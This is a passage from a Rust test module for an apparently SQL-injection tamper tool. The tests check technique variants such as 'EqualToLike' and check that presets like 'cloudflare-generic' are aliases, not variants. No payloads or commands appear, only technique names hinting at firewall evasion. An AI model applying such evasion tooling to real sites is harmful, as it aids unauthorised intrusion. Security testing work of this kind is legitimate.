                Tamper::VersionedFuzz,
                Tamper::EqualToLike,
            ]
        );
    }

    #[test]
    fn presets_are_aliases_not_variants() {
        assert!(!Tamper::all_names().contains(&"cloudflare-generic"));
        assert!(!Tamper::all_names().contains(&"aggressive"));
        assert!(Tamper::from_name("cloudflare-generic").is_none());
        assert!(Tamper::from_name("aggressive").is_none());
    }
}
